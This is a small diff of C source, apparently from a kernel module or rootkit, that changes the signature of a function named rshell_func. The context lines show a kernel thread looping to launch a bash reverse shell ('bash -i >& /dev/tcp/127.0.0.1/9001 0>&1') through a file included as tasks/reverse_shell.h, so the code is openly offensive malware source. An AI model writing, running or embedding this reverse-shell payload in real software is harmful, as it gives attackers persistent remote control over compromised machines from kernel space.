@@ -1,6 +1,6 @@
 #include "tasks/reverse_shell.h"
 
-int rshell_func(void) {
+int rshell_func(void* data) {
     while (!kthread_should_stop()) {
         char* argv[] = { "/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1", NULL};
         static char* envp[] = {
